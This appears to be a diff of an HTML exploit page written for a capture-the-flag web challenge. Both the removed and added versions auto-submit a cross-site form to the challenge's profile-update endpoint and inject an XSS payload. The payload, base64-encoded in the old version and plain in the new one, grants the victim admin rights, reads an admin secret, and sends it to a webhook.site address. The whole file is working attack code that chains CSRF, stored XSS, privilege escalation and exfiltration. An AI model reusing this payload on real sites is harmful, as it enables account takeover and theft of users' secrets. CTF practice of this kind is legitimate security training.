@@ -1,12 +1,17 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form id="f" method="POST" action="http://ctf.learn-it.org:39951/api/update-profile" enctype="text/plain" target="_blank">
-<input name='{"isAdmin":true,"avatar":{"skin":"</svg><img src=x onerror=eval(atob(&#39;ZmV0Y2goJy9hcGkvYWRtaW4vc2VjcmV0Jyx7Y3JlZGVudGlhbHM6J2luY2x1ZGUnfSkudGhlbihyPT5yLmpzb24oKSkudGhlbihkPT5sb2NhdGlvbj0naHR0cHM6Ly93ZWJob29rLnNpdGUvMjQwNzc5YWMtYjM4Mi00ZGVhLWFiNjYtZTJiNTMxNTU5YzIzP2ZsYWc9JytkLmZsYWcp&#39;))>"},"x":"' value='"}'>
+<form id="f" action="http://ctf.learn-it.org:39951/api/update-profile" method="POST" target="x">
+<input name="avatar[skin]" value="x" />
+<input name="avatar[hair]" value="x" />
+<input name="avatar[eyes]" value="x" />
+<input name="avatar[shirt]" value="x" />
+<input name="avatar[background]" value="&quot;&gt;&lt;/svg&gt;&lt;img src=x onerror=fetch('/api/update-profile',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({isAdmin:true})}).then(()=&gt;fetch('/api/admin/secret',{credentials:'include'})).then(r=&gt;r.json()).then(d=&gt;location='https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?flag='+d.flag)&gt;" />
 </form>
+<iframe name="x" style="display:none"></iframe>
 <script>
 document.getElementById('f').submit();
-setTimeout(function(){location='http://ctf.learn-it.org:39951/dashboard';},1000);
+setTimeout(function(){ location='http://ctf.learn-it.org:39951/dashboard'; }, 1000);
 </script>
 </body>
 </html>
